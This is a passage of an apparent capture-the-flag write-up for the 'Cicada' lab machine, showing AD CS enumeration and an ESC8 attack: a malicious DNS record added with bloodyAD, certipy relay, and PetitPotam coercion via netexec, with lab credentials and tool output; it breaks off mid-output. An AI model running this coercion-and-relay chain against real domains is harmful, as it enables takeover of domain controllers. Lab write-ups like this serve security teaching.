cicada-DC-JPQ225-CA(14)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(14).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(15)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(15).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(16)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(16).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(17)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(17).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(18)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(18).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(19)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(19).crl -rw-rw-rw- 741 Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA(2)+.crl -rw-rw-rw- 941 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(2).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(20)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(20).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(21)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(21).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(22)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(22).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(23)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(23).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(24)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(24).crl -rw-rw-rw- 742 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(25)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(25).crl -rw-rw-rw- 742 Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(26)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(26).crl -rw-rw-rw- 742 Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(27)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(27).crl -rw-rw-rw- 742 Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(28)+.crl -rw-rw-rw- 943 Mon Jun 16 20:36:06 2025 cicada-DC-JPQ225-CA(28).crl -rw-rw-rw- 741 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(3)+.crl -rw-rw-rw- 941 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(3).crl -rw-rw-rw- 741 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(4)+.crl -rw-rw-rw- 941 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(4).crl -rw-rw-rw- 741 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(5)+.crl -rw-rw-rw- 941 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(5).crl -rw-rw-rw- 741 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(6)+.crl -rw-rw-rw- 941 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(6).crl -rw-rw-rw- 741 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(7)+.crl -rw-rw-rw- 941 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(7).crl -rw-rw-rw- 741 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(8)+.crl -rw-rw-rw- 941 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(8).crl -rw-rw-rw- 741 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(9)+.crl -rw-rw-rw- 941 Mon Jun 16 20:36:07 2025 cicada-DC-JPQ225-CA(9).crl -rw-rw-rw- 736 Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA+.crl -rw-rw-rw- 933 Mon Jun 16 20:36:08 2025 cicada-DC-JPQ225-CA.crl -rw-rw-rw- 1385 Sun Sep 15 13:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(0-1).crt -rw-rw-rw- 924 Sun Sep 15 07:51:18 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1).crt -rw-rw-rw- 1390 Sun Sep 15 13:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1-0).crt -rw-rw-rw- 1390 Sun Sep 15 13:18:43 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(1-2).crt -rw-rw-rw- 924 Thu Apr 10 08:44:43 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10).crt -rw-rw-rw- 1391 Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10-11).crt -rw-rw-rw- 1391 Thu Apr 10 08:57:00 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(10-9).crt -rw-rw-rw- 924 Thu Apr 10 08:58:25 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11).crt -rw-rw-rw- 1391 Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11-10).crt -rw-rw-rw- 1391 Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(11-12).crt -rw-rw-rw- 924 Thu Apr 10 09:00:22 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12).crt -rw-rw-rw- 1391 Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12-11).crt -rw-rw-rw- 1391 Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(12-13).crt -rw-rw-rw- 924 Thu Apr 10 09:03:13 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13).crt -rw-rw-rw- 1391 Fri Apr 11 05:48:18 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13-12).crt -rw-rw-rw- 1391 Tue Jun 3 10:21:47 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(13-14).crt -rw-rw-rw- 924 Fri Apr 11 05:49:41 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14).crt -rw-rw-rw- 1391 Tue Jun 3 10:22:11 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14-13).crt -rw-rw-rw- 1391 Tue Jun 3 10:22:11 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(14-15).crt -rw-rw-rw- 924 Fri Apr 11 05:51:40 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15).crt -rw-rw-rw- 1391 Tue Jun 3 10:22:11 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15-14).crt -rw-rw-rw- 1391 Tue Jun 3 10:22:12 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(15-16).crt -rw-rw-rw- 924 Fri Apr 11 05:53:40 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16).crt -rw-rw-rw- 1391 Tue Jun 3 10:22:12 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16-15).crt -rw-rw-rw- 1391 Wed Jun 4 12:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(16-17).crt -rw-rw-rw- 924 Tue Jun 3 10:23:15 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17).crt -rw-rw-rw- 1391 Wed Jun 4 12:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17-16).crt -rw-rw-rw- 1391 Wed Jun 4 12:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(17-18).crt -rw-rw-rw- 924 Tue Jun 3 10:24:51 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18).crt -rw-rw-rw- 1391 Wed Jun 4 12:51:26 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18-17).crt -rw-rw-rw- 1391 Wed Jun 4 12:51:27 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(18-19).crt -rw-rw-rw- 924 Tue Jun 3 10:26:51 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19).crt -rw-rw-rw- 1391 Wed Jun 4 12:51:27 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19-18).crt -rw-rw-rw- 1391 Wed Jun 4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(19-20).crt -rw-rw-rw- 924 Sun Sep 15 07:53:03 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2).crt -rw-rw-rw- 1390 Sun Sep 15 13:18:44 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2-1).crt -rw-rw-rw- 1390 Sun Sep 29 09:41:29 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(2-3).crt -rw-rw-rw- 924 Wed Jun 4 12:52:43 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20).crt -rw-rw-rw- 1391 Wed Jun 4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20-19).crt -rw-rw-rw- 1391 Wed Jun 4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(20-21).crt -rw-rw-rw- 924 Wed Jun 4 12:54:47 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21).crt -rw-rw-rw- 1391 Wed Jun 4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21-20).crt -rw-rw-rw- 1391 Wed Jun 4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(21-22).crt -rw-rw-rw- 924 Wed Jun 4 12:56:47 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22).crt -rw-rw-rw- 1391 Wed Jun 4 13:34:59 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22-21).crt -rw-rw-rw- 1391 Wed Jun 4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(22-23).crt -rw-rw-rw- 924 Wed Jun 4 13:36:17 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23).crt -rw-rw-rw- 1391 Wed Jun 4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23-22).crt -rw-rw-rw- 1391 Wed Jun 4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(23-24).crt -rw-rw-rw- 924 Wed Jun 4 13:38:20 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24).crt -rw-rw-rw- 1391 Wed Jun 4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24-23).crt -rw-rw-rw- 1391 Wed Jun 4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(24-25).crt -rw-rw-rw- 924 Wed Jun 4 13:40:21 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25).crt -rw-rw-rw- 1391 Wed Jun 4 14:02:35 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25-24).crt -rw-rw-rw- 1391 Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(25-26).crt -rw-rw-rw- 924 Wed Jun 4 14:04:01 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26).crt -rw-rw-rw- 1391 Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26-25).crt -rw-rw-rw- 1391 Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(26-27).crt -rw-rw-rw- 924 Wed Jun 4 14:05:56 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27).crt -rw-rw-rw- 1391 Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27-26).crt -rw-rw-rw- 1391 Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(27-28).crt -rw-rw-rw- 924 Wed Jun 4 14:07:56 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(28).crt -rw-rw-rw- 1391 Mon Jun 16 20:36:06 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(28-27).crt -rw-rw-rw- 924 Mon Jun 16 20:37:22 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(29).crt -rw-rw-rw- 924 Sun Sep 15 13:21:57 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3).crt -rw-rw-rw- 1390 Sun Sep 29 09:41:29 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3-2).crt -rw-rw-rw- 1390 Sun Sep 29 09:41:29 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(3-4).crt -rw-rw-rw- 924 Mon Jun 16 20:39:25 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(30).crt -rw-rw-rw- 924 Mon Jun 16 20:41:25 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(31).crt -rw-rw-rw- 924 Sun Sep 15 13:24:12 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4).crt -rw-rw-rw- 1390 Sun Sep 29 09:41:30 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4-3).crt -rw-rw-rw- 1390 Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(4-5).crt -rw-rw-rw- 924 Sun Sep 29 09:43:51 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5).crt -rw-rw-rw- 1390 Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5-4).crt -rw-rw-rw- 1390 Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(5-6).crt -rw-rw-rw- 924 Sun Sep 29 09:44:59 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6).crt -rw-rw-rw- 1390 Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6-5).crt -rw-rw-rw- 1390 Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(6-7).crt -rw-rw-rw- 924 Sun Sep 29 09:46:59 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7).crt -rw-rw-rw- 1390 Thu Apr 10 08:36:39 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7-6).crt -rw-rw-rw- 1390 Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(7-8).crt -rw-rw-rw- 924 Thu Apr 10 08:40:45 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8).crt -rw-rw-rw- 1390 Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8-7).crt -rw-rw-rw- 1390 Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(8-9).crt -rw-rw-rw- 924 Thu Apr 10 08:42:44 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9).crt -rw-rw-rw- 1390 Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9-10).crt -rw-rw-rw- 1390 Thu Apr 10 08:56:48 2025 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA(9-8).crt -rw-rw-rw- 885 Fri Sep 13 10:50:51 2024 DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA.crt -rw-rw-rw- 331 Fri Sep 13 15:17:59 2024 nsrev_cicada-DC-JPQ225-CA.asp </span></code></pre></div></div> <p>These are public keys, and not sensitive.</p> <h3 id="adcs-enumeration">ADCS Enumeration</h3> <p>Given the ADCS activity, I’ll scan for ADCS vulnerabilities using <code class="language-plaintext highlighter-rouge">certipy</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy find <span class="nt">-target</span> DC-JPQ225.cicada.vl <span class="nt">-u</span> Rosie.Powell@cicada.vl <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="nt">-vulnerable</span> <span class="nt">-stdout</span> <span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k) [!] KRB5CCNAME environment variable not set [*] Finding certificate templates [*] Found 33 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 11 enabled certificate templates [*] Finding issuance policies [*] Found 13 issuance policies [*] Found 0 OIDs linked to templates [*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP [!] Failed to connect to remote registry. Service should be starting now. Trying again... [*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA' [*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl' [!] Error checking web enrollment: timed out [!] Use -debug to print a stacktrace [*] Enumeration output: Certificate Authorities 0 CA Name : cicada-DC-JPQ225-CA DNS Name : DC-JPQ225.cicada.vl Certificate Subject : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl Certificate Serial Number : 6B8F71DF18F81D804D7BF4E3504C6C4D Certificate Validity Start : 2025-06-16 20:31:15+00:00 Certificate Validity End : 2525-06-16 20:41:15+00:00 Web Enrollment HTTP Enabled : True HTTPS Enabled : False User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Active Policy : CertificateAuthority_MicrosoftDefault.Policy Permissions Owner : CICADA.VL\Administrators Access Rights ManageCa : CICADA.VL\Administrators CICADA.VL\Domain Admins CICADA.VL\Enterprise Admins ManageCertificates : CICADA.VL\Administrators CICADA.VL\Domain Admins CICADA.VL\Enterprise Admins Enroll : CICADA.VL\Authenticated Users [!] Vulnerabilities ESC8 : Web Enrollment is enabled over HTTP. Certificate Templates : [!] Could not find any certificate templates </span></code></pre></div></div> <p>It does not find any vulnerable templates, but it finds that the CA itself is vulnerable to ESC8.</p> <h3 id="esc8-exploitation">ESC8 Exploitation</h3> <h4 id="background">Background</h4> <p>The <a href="https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc8-ntlm-relay-to-ad-cs-web-enrollment">Certipy Wiki</a> describes ESC8 as:</p> <blockquote> <p>ESC8 describes a privilege escalation vector where an attacker performs an NTLM relay attack against an AD CS HTTP-based enrollment endpoint. These web-based interfaces provide alternative methods for users and computers to request certificates.</p> </blockquote> <p>The wiki goes on to describe the attack in six steps:</p> <blockquote> <ol> <li><strong>Coerce Authentication:</strong> The attacker coerces a privileged account to authenticate to a machine controlled by the attacker using NTLM. Common targets for coercion include Domain Controller machine accounts (e.g., using tools like PetitPotam or Coercer, or other RPC-based coercion techniques against MS-EFSRPC, MS-RPRN, etc.) or Domain Admin user accounts (e.g., via phishing or other social engineering that triggers an NTLM authentication).</li> <li><strong>Set up NTLM Relay:</strong> The attacker uses an NTLM relay tool, such as Certipy’s <code class="language-plaintext highlighter-rouge">relay</code> command, listening for incoming NTLM authentications.</li> <li><strong>Relay Authentication:</strong> When the victim account authenticates to the attacker’s machine, Certipy captures this incoming NTLM authentication attempt and forwards (relays) it to the vulnerable AD CS HTTP web enrollment endpoint (e.g., <code class="language-plaintext highlighter-rouge">https://&lt;ca_server&gt;/certsrv/certfnsh.asp</code>).</li> <li><strong>Impersonate and Request Certificate:</strong> The AD CS web service, receiving what it believes to be a legitimate NTLM authentication from the relayed privileged account, processes subsequent enrollment requests from Certipy as that privileged account. Certipy then requests a certificate, typically specifying a template for which the relayed privileged account has enrollment rights (e.g., the “DomainController” template if a DC machine account is relayed, or the default “User” template for a user account).</li> <li><strong>Obtain Certificate:</strong> The CA issues the certificate. Certipy, acting as the intermediary, receives this certificate.</li> <li><strong>Use Certificate for Privileged Access:</strong> The attacker can now use this certificate (e.g., in a <code class="language-plaintext highlighter-rouge">.pfx</code> file) with <code class="language-plaintext highlighter-rouge">certipy auth</code> to authenticate as the impersonated privileged account via Kerberos PKINIT, potentially leading to full domain compromise.</li> </ol> </blockquote> <p>Basically if I can get the machine to authenticate back to me, I’ll relay that auth to ADCS and get a certificate as the machine account. <a href="https://www.tiraniddo.dev/2024/04/relaying-kerberos-authentication-from.html">This post</a> from Tyranid’s Lair shows how it’s possible to relay Kerberos authentication.</p> <h4 id="strategies">Strategies</h4> <p>There are at least two ways to approach this exploitation.</p> <p>The first is to create a Windows VM and join it to the domain. The MachineAccountQuota is set to 10 (the default), so this should be do able:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec ldap DC-JPQ225.cicada.vl <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="nt">-M</span> maq <span class="netexec-protocol">LDAP </span><span class="go"> DC-JPQ225.cicada.vl 389 DC-JPQ225 </span><span class="netexec-logmessage">[*]</span><span class="go"> None (name:DC-JPQ225) (domain:cicada.vl) (signing:None) (channel binding:Never) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go"> </span><span class="netexec-protocol">LDAP </span><span class="go"> DC-JPQ225.cicada.vl 389 DC-JPQ225 </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\Rosie.Powell:Cicada123 </span><span class="nb">MAQ </span><span class="go"> DC-JPQ225.cicada.vl 389 DC-JPQ225 </span><span class="netexec-logmessage">[*]</span><span class="go"> Getting the MachineAccountQuota </span><span class="nb">MAQ </span><span class="go"> DC-JPQ225.cicada.vl 389 DC-JPQ225 MachineAccountQuota: 10 </span></code></pre></div></div> <p>With a Windows host on the domain, I can run <a href="https://github.com/CICADA8-Research/RemoteKrbRelay">RemoteKrbRelay</a>, which will handle the entire exploit, coercing authentication and relaying it to the HTTP certificate server.</p> <p>The other approach is from my Linux VM, where I’ll use the strategy described in <a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html">this Synactiv post</a> to add a DNS record that includes a serialized SPN that will trick the server into requesting a Kerberos ticket for the machine account but connects to the malicious record which points to the attacker. The attacker can relay that back to the DC to request a ticket.</p> <pre><code class="language-mermaid">flowchart TD; A[Auth as\nRosie.Powell]--&gt;B(Join Windows VM\nto domain); B--&gt;C(RemoteKrbRelay.exe); C--&gt;D[Certificate as\nDC-JPQ225$]; A--&gt;E(Add malicious\nDNS record); E--&gt;F(Coerce with\nPetitPotam); F--&gt;D; </code></pre> <p>I’ll only show the Linux attack path here. The machine author, xct, covers the first approach in <a href="https://vuln.dev/vulnlab-cicada/">his writeup</a>.</p> <h4 id="attack">Attack</h4> <p>The record to add is structured as <code class="language-plaintext highlighter-rouge">&lt;host&gt;&lt;empty CREDENTIAL_TARGET_INFOMATION structure&gt;</code>, which in this case will be <code class="language-plaintext highlighter-rouge">DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA</code>. I’ll set the DNS record with <code class="language-plaintext highlighter-rouge">bloodyAD</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>bloodyAD <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-d</span> cicada.vl <span class="nt">-k</span> <span class="nt">--host</span> DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.14.79 <span class="go">[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added </span></code></pre></div></div> <p>I’ll start <code class="language-plaintext highlighter-rouge">certipy relay</code> targeting the ADCS webserver, and it listens on SMB:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy relay <span class="nt">-target</span> <span class="s1">'http://dc-jpq225.cicada.vl/'</span> <span class="nt">-template</span> DomainController <span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8) [*] Listening on 0.0.0.0:445 [*] Setting up SMB Server on port 445 </span></code></pre></div></div> <p>The <code class="language-plaintext highlighter-rouge">netexec</code> module <code class="language-plaintext highlighter-rouge">coerce_plus</code> will check several different methods for coercing authentication from the machine account:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="nt">-M</span> coerce_plus <span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logmessage">[*]</span><span class="go"> x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go"> </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\Rosie.Powell:Cicada123 COERCE_PLUS DC-JPQ225.cicada.vl 445 DC-JPQ225 VULNERABLE, DFSCoerce COERCE_PLUS DC-JPQ225.cicada.vl 445 DC-JPQ225 VULNERABLE, PetitPotam COERCE_PLUS DC-JPQ225.cicada.vl 445 DC-JPQ225 VULNERABLE, PrinterBug COERCE_PLUS DC-JPQ225.cicada.vl 445 DC-JPQ225 VULNERABLE, PrinterBug </span></code></pre></div></div> <p>In theory any of these should work. I have the best luck with PetitPotam. To trigger it, I’ll give <code class="language-plaintext highlighter-rouge">netexec</code> the <code class="language-plaintext highlighter-rouge">LISTENER</code> of the malicious DNS record, and the <code class="language-plaintext highlighter-rouge">METHOD</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>netexec smb DC-JPQ225.cicada.vl <span class="nt">-u</span> Rosie.Powell <span class="nt">-p</span> Cicada123 <span class="nt">-k</span> <span class="nt">-M</span> coerce_plus <span class="nt">-o</span> <span class="nv">LISTENER</span><span class="o">=</span>DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA <span class="nv">METHOD</span><span class="o">=</span>PetitPotam <span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logmessage">[*]</span><span class="go"> x64 (name:DC-JPQ225) (domain:cicada.vl) (</span><span class="netexec-logsuccess">signing:True</span><span class="go">) (</span><span class="nb">SMBv1:False</span><span class="go">) </span><span class="netexec-shareenum">(NTLM:False)</span><span class="go"> </span><span class="netexec-protocol">SMB </span><span class="go"> DC-JPQ225.cicada.vl 445 DC-JPQ225 </span><span class="netexec-logsuccess">[+]</span><span class="go"> cicada.vl\Rosie.Powell:Cicada123 COERCE_PLUS DC-JPQ225.cicada.vl 445 DC-JPQ225 VULNERABLE, PetitPotam COERCE_PLUS DC-JPQ225.cicada.vl 445 DC-JPQ225 Exploit Success, lsarpc\EfsRpcAddUsersToFile </span></code></pre></div></div> <p>At the relay, there’s a connection, and it eventually creates a <code class="language-plaintext highlighter-rouge">.pfx</code> file:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>certipy relay <span class="nt">-target</span> <span class="s1">'http://dc-jpq225.cicada.vl/'</span> <span class="nt">-template</span> DomainController <span class="go">Certipy v5.0.3 - by Oliver Lyak (ly4k) [*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8) [*] Listening on 0.0.0.0:445 [*] Setting up SMB Server on port 445 [*] SMBD-Thread-2 (process_request_thread): Received connection from 10.129.234.48, attacking target http://dc-jpq225.cicada.vl [-] Unsupported MechType 'MS KRB5 - Microsoft Kerberos 5' [*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized" [*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized" [*] HTTP Request: GET 